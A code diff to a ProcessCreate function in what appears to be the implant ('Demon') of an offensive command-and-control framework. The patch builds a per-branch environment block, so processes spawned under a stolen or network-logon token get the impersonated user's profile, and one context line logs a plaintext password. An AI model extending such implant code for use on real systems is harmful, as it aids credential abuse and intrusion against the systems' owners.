@@ -637,17 +637,12 @@ BOOL ProcessCreate(
     }
 #endif
 
-    /* Build an environment block so child processes get a proper PATH even when
-     * the Demon process was started with an empty environment (e.g. spawned by
-     * a service with no inherited environment).  CreateEnvironmentBlock reads
-     * the user's environment from the registry and is independent of the
-     * current process's own (potentially empty) environment block. */
-    if ( Instance->Win32.CreateEnvironmentBlock ) {
-        Instance->Win32.CreateEnvironmentBlock( &EnvBlock, NULL, FALSE );
-        PRINTF( "CreateEnvironmentBlock: %s\n", EnvBlock ? "OK" : "FAILED" )
-    }
-    /* When we have an explicit environment block it must be a Unicode block. */
-    DWORD EnvFlags = EnvBlock ? CREATE_UNICODE_ENVIRONMENT : 0;
+    /* EnvBlock is built per-branch so the correct token's environment is used.
+     * For TOKEN_TYPE_STOLEN we pass PrimaryToken so the child gets the right
+     * USERPROFILE/APPDATA/etc for the impersonated user.  NULL is acceptable
+     * for MAKE_NETWORK (no local token available) and the plain CreateProcessW
+     * path. */
+    DWORD EnvFlags = 0;
 
     if ( Instance->Tokens.Impersonate )
     {
@@ -681,6 +676,15 @@ BOOL ProcessCreate(
                 }
             }
 
+            /* Build environment block from the stolen token so the child process
+             * gets the correct USERPROFILE, APPDATA, etc. for the impersonated user
+             * rather than the Demon process's own (e.g. SYSTEM) environment. */
+            if ( Instance->Win32.CreateEnvironmentBlock ) {
+                Instance->Win32.CreateEnvironmentBlock( &EnvBlock, PrimaryToken, FALSE );
+                PRINTF( "CreateEnvironmentBlock(PrimaryToken): %s\n", EnvBlock ? "OK" : "FAILED" )
+            }
+            EnvFlags = EnvBlock ? CREATE_UNICODE_ENVIRONMENT : 0;
+
             PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance->Win32.CreateProcessWithTokenW(
                     PrimaryToken,
@@ -703,6 +707,12 @@ BOOL ProcessCreate(
         }
         else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
+            if ( Instance->Win32.CreateEnvironmentBlock ) {
+                Instance->Win32.CreateEnvironmentBlock( &EnvBlock, NULL, FALSE );
+                PRINTF( "CreateEnvironmentBlock: %s\n", EnvBlock ? "OK" : "FAILED" )
+            }
+            EnvFlags = EnvBlock ? CREATE_UNICODE_ENVIRONMENT : 0;
+
             PUTS( "CreateProcessWithLogonW" )
             PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
             if ( ! Instance->Win32.CreateProcessWithLogonW(
@@ -727,6 +737,12 @@ BOOL ProcessCreate(
     }
     else
     {
+        if ( Instance->Win32.CreateEnvironmentBlock ) {
+            Instance->Win32.CreateEnvironmentBlock( &EnvBlock, NULL, FALSE );
+            PRINTF( "CreateEnvironmentBlock: %s\n", EnvBlock ? "OK" : "FAILED" )
+        }
+        EnvFlags = EnvBlock ? CREATE_UNICODE_ENVIRONMENT : 0;
+
         if ( ! Instance->Win32.CreateProcessW(
                 App,
                 CmdLine,
